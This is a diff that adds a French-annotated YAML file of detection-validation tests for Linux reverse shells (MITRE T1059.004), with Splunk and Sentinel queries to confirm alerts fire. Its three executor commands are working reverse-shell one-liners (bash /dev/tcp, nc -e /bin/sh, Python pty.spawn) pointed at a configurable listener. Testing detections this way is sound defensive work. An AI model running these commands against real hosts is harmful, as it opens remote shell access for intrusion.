@@ -1,0 +1,66 @@
+attack_technique: T1059.004
+display_name: Linux Reverse Shell
+related_sigma_rule: ../linux_reverse_shell.yml
+expected_alert_within_seconds: 30
+prerequisites:
+  - Linux lab (Ubuntu/Debian/RHEL) avec auditd configuré
+  - Listener netcat sur un poste de lab contrôlé
+  - Aucune connectivité prod (réseau isolé)
+warning: |
+  Tests à exécuter UNIQUEMENT en lab isolé. Le simple fait de lancer ces
+  commandes établit un canal d'exécution arbitraire — risque opérationnel
+  élevé hors environnement de test contrôlé.
+atomic_tests:
+  - name: Bash /dev/tcp reverse shell
+    description: |
+      Pattern le plus courant — bash redirige vers /dev/tcp pour ouvrir
+      un canal interactif vers le listener.
+    supported_platforms: [linux]
+    input_arguments:
+      listener_ip:
+        description: IP du listener nc (lab)
+        type: string
+        default: "127.0.0.1"
+      listener_port:
+        description: Port du listener
+        type: integer
+        default: 4444
+    executor:
+      name: bash
+      elevation_required: false
+      command: |
+        timeout 3 bash -c 'bash -i >& /dev/tcp/#{listener_ip}/#{listener_port} 0>&1' || true
+
+  - name: Netcat avec exec
+    description: Pattern `nc -e /bin/sh` (ou `ncat`).
+    supported_platforms: [linux]
+    executor:
+      name: bash
+      elevation_required: false
+      command: |
+        which nc && timeout 3 nc -e /bin/sh 127.0.0.1 4444 2>/dev/null || true
+
+  - name: Python3 socket + dup2 + pty.spawn
+    description: One-liner Python classique des cheatsheets pentest.
+    supported_platforms: [linux]
+    executor:
+      name: bash
+      elevation_required: false
+      command: |
+        timeout 3 python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET);s.settimeout(2);
+        try:
+          s.connect(("127.0.0.1",4444))
+          [os.dup2(s.fileno(),f) for f in (0,1,2)]
+          pty.spawn("/bin/sh")
+        except Exception:
+          pass' 2>/dev/null || true
+validation_queries:
+  splunk: |
+    index=linux sourcetype=linux_audit type=EXECVE earliest=-15m
+    | where match(proctitle, "(?i)(/dev/tcp|/dev/udp|nc -e|pty\\.spawn|dup2)")
+  sentinel: |
+    DeviceProcessEvents
+    | where Timestamp > ago(15m)
+    | where ProcessCommandLine matches regex @"(?i)(/dev/(tcp|udp)|nc\s+-e|pty\.spawn|dup2|socket\.AF_INET)"
+references:
+  - https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1059.004
